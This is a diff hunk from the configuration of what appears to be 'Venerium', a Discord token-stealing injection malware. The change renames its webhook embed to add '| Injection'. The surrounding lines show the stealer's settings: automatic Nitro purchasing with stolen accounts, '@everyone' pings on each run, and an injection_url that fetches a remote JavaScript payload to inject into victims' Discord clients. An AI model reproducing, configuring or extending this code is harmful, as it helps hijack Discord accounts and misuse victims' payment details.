@@ -12,7 +12,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Venerium Vaccination', 
+  embed_name: 'Venerium Vaccination | Injection', 
   embed_icon: 'https://raw.githubusercontent.com/vilished/image-src/main/175107031.jpeg',
   embed_color: 0x7289DA, 
   injection_url: 'https://raw.githubusercontent.com/beztpro9/-/main/Url.js', 
